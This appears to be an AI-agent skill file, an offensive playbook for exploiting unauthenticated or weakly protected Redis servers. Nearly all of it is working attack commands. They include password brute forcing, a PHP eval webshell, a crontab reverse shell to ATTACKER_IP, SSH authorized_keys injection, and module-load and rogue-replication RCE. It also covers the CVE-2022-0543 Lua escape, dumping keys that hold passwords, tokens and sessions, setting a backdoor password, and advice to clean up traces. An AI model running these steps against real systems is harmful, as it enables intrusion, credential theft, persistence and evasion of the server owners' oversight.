---
name: redis-attack
description: "Redis unauthorized access and exploitation. Use when a target exposes port 6379, the Redis service has no authentication or weak credentials, or you need to extract sensitive data or achieve remote command execution through Redis. Covers unauthorized access, data theft, crontab-write RCE, replication RCE, module-load RCE, webshell writing, SSH public key injection, Lua script injection, Pub/Sub eavesdropping, and persistence file abuse"
zh-signals: "Redis 未授权访问与利用，覆盖未授权检测、crontab/主从复制/模块加载 RCE 与数据窃取。信号:redis,6379,未授权,rce,主从复制,webshell"
when-to-use: >-
  Use when the target exposes Redis on port 6379, the service accepts unauthenticated
  or weak-credential access, or you need to extract data or achieve RCE through Redis.
metadata:
  tags: "redis,6379,unauthorized,rce,replication,crontab,webshell,ssh-key,lua,module-load,redis-rogue-server"
  category: "exploit"
---

# Redis Unauthorized Access and Exploitation

Redis has no authentication by default and listens on 0.0.0.0 — once exposed to the network the attack surface is huge, since going from data theft to RCE takes only a few commands.

## ⛔ Further Reading (Must Read)
- Full exploitation commands and payloads → read [references/attack-techniques.md](references/attack-techniques.md)

---

## Phase 1: Service Discovery and Version Identification

### 1.1 Nmap Scan

```bash
# Redis information gathering script
nmap -p 6379 --script redis-info TARGET

# Version detection
nmap -sV -p 6379 TARGET
```

### 1.2 Manual Connection Test

```bash
# PING to test connectivity
redis-cli -h TARGET -p 6379 PING
# A PONG response means no authentication is required

# Fetch server information (pay attention to redis_version, os, config_file)
redis-cli -h TARGET -p 6379 INFO server
```

**Key Decision**:
- PONG / normal information returned → no authentication, go straight to Phase 3
- `-NOAUTH Authentication required` returned → authentication required, go to Phase 2
- `redis_version` returned → determine the version and decide which attack paths are available

---

## Phase 2: Unauthorized / Weak Credential Detection

### 2.1 Common Weak Credentials

```bash
# Try them one by one
redis-cli -h TARGET -p 6379 -a redis INFO server
redis-cli -h TARGET -p 6379 -a password INFO server
redis-cli -h TARGET -p 6379 -a 123456 INFO server
redis-cli -h TARGET -p 6379 -a admin INFO server
redis-cli -h TARGET -p 6379 -a root INFO server
```

### 2.2 Brute Force

```bash
# Hydra
hydra -P passwords.txt redis://TARGET

# Nmap
nmap --script redis-brute -p 6379 TARGET

# Medusa
medusa -h TARGET -P passwords.txt -M redis
```

---

## Phase 3: Attack Decision Tree

```
Connection successful?
├─ CONFIG SET allowed → RCE path
│   ├─ Target runs a web service → webshell write (Phase 4.1)
│   ├─ Target runs cron → crontab reverse shell (Phase 4.2)
│   └─ Target runs SSH → write authorized_keys (Phase 4.3)
├─ Redis >= 4.0 → module load RCE (Phase 4.4)
├─ Redis >= 4.0 → replication RCE / redis-rogue-server (Phase 4.5)
├─ KEYS/GET allowed → data theft (Phase 5)
│   ├─ Search *password*, *token*, *session*
│   └─ HGETALL to walk Hash data
├─ PSUBSCRIBE allowed → Pub/Sub eavesdropping (Phase 6)
└─ EVAL allowed → Lua script injection (Phase 6)
```

**Preliminary Information Gathering**:

```bash
# Get the current working directory and database file name (must check before the CONFIG SET attack)
redis-cli -h TARGET -p 6379 CONFIG GET dir
redis-cli -h TARGET -p 6379 CONFIG GET dbfilename

# Get the full configuration
redis-cli -h TARGET -p 6379 CONFIG GET "*"

# Check the Redis version (decides whether module load / replication is available)
redis-cli -h TARGET -p 6379 INFO server
```

---

## Phase 4: Quick Exploitation Commands

### 4.1 Webshell Write

```bash
redis-cli -h TARGET -p 6379
> CONFIG SET dir /var/www/html
> CONFIG SET dbfilename shell.php
> SET payload "<?php @eval($_POST['cmd']);?>"
> SAVE
```

Verify: `curl http://TARGET/shell.php`

### 4.2 Crontab RCE

```bash
redis-cli -h TARGET -p 6379
> SET cron "\n\n*/1 * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'\n\n"
> CONFIG SET dir /var/spool/cron/
> CONFIG SET dbfilename root
> SAVE
```

Note: the Ubuntu/Debian path is `/var/spool/cron/crontabs/`, while CentOS/RHEL uses `/var/spool/cron/`.

### 4.3 SSH Public Key Write

```bash
# Generate the key pair
ssh-keygen -t rsa -f /tmp/redis_rsa

# Format the public key (add newlines before and after to avoid interference from Redis data)
(echo -e "\n\n"; cat /tmp/redis_rsa.pub; echo -e "\n\n") > /tmp/spaced_key.txt

# Import and write
cat /tmp/spaced_key.txt | redis-cli -h TARGET -p 6379 -x set ssh_key
redis-cli -h TARGET -p 6379 CONFIG SET dir /var/lib/redis/.ssh
# If Redis runs as root, use /root/.ssh instead
redis-cli -h TARGET -p 6379 CONFIG SET dbfilename authorized_keys
redis-cli -h TARGET -p 6379 SAVE

# Login
ssh -i /tmp/redis_rsa redis@TARGET
```

### 4.4 Module Load RCE (Redis >= 4.0)

```bash
# The malicious .so must be uploaded to the target first (via replication or another route)
redis-cli -h TARGET -p 6379 MODULE LOAD /path/to/module.so
redis-cli -h TARGET -p 6379 system.exec "id"
redis-cli -h TARGET -p 6379 system.rev ATTACKER_IP 9999
```

### 4.5 Replication RCE

```bash
# Automated exploitation (Redis <= 5.0.5)
python3 redis-rogue-server.py --rhost TARGET --rport 6379 --lhost ATTACKER_IP

# Manual exploitation
redis-cli -h TARGET -p 6379 SLAVEOF ATTACKER_IP 6379
# After the malicious module is transferred
redis-cli -h TARGET -p 6379 MODULE LOAD /tmp/module.so
redis-cli -h TARGET -p 6379 system.exec "id"
# Cleanup
redis-cli -h TARGET -p 6379 MODULE UNLOAD mymodule
redis-cli -h TARGET -p 6379 SLAVEOF NO ONE
```

→ More methods and complete payloads → read [references/attack-techniques.md](references/attack-techniques.md)

---

## Phase 5: Data Theft

```bash
# List all keys
redis-cli -h TARGET -p 6379 KEYS "*"

# Search sensitive key names
redis-cli -h TARGET -p 6379 KEYS "*password*"
redis-cli -h TARGET -p 6379 KEYS "*secret*"
redis-cli -h TARGET -p 6379 KEYS "*token*"
redis-cli -h TARGET -p 6379 KEYS "*session*"

# Fetch values
redis-cli -h TARGET -p 6379 GET keyname

# Walk Hash-typed data
redis-cli -h TARGET -p 6379 HGETALL keyname

# Use SCAN instead of KEYS on large databases (avoids blocking)
redis-cli -h TARGET -p 6379 SCAN 0 MATCH "*password*" COUNT 100
```

→ Read [references/attack-techniques.md](references/attack-techniques.md) for the complete data theft commands

---

## Phase 6: Other Attack Vectors

### 6.1 Pub/Sub Eavesdropping

```bash
# Subscribe to all channels
redis-cli -h TARGET -p 6379 PSUBSCRIBE "*"
```

### 6.2 Lua Script Injection

```bash
# Execute system commands (CVE-2022-0543, Debian/Ubuntu specific)
redis-cli -h TARGET -p 6379 EVAL 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res' 0
```

### 6.3 Configuration Tampering

```bash
# Read the current authentication configuration
redis-cli -h TARGET -p 6379 CONFIG GET requirepass
redis-cli -h TARGET -p 6379 CONFIG GET masterauth

# Set a backdoor password
redis-cli -h TARGET -p 6379 CONFIG SET requirepass "backdoor_pass"
```

### 6.4 Persistence File Abuse

```bash
# Trigger RDB persistence
redis-cli -h TARGET -p 6379 BGSAVE

# Get the persistence file path
redis-cli -h TARGET -p 6379 CONFIG GET dir
redis-cli -h TARGET -p 6379 CONFIG GET dbfilename

# Download it and parse it with rdbtools
rdb --command json /path/to/dump.rdb
```

→ Read [references/attack-techniques.md](references/attack-techniques.md) for the complete technical details

---

## Tool Quick Reference

| Tool | Purpose |
|------|------|
| redis-cli | Official Redis client |
| redis-rogue-server | Automated replication RCE |
| RedisModules-ExecuteCommand | Malicious .so module generation |
| rdbtools | RDB persistence file parsing |
| hydra / medusa | Redis password brute force |
| nmap redis-info / redis-brute | Redis information gathering and brute-force scripts |

---

## Notes

- `SAVE` blocks Redis and may cause a service outage; prefer `BGSAVE` in production
- `CONFIG SET` operations are logged by Redis — clean up your traces
- `KEYS *` severely blocks large databases; use `SCAN` in production
- A CONFIG SET file write overwrites the existing RDB content — back up `CONFIG GET dir` and `CONFIG GET dbfilename` before operating
- Always run `SLAVEOF NO ONE` and `MODULE UNLOAD` for cleanup after replication RCE
- Crontab writing only works when the target runs Redis as root
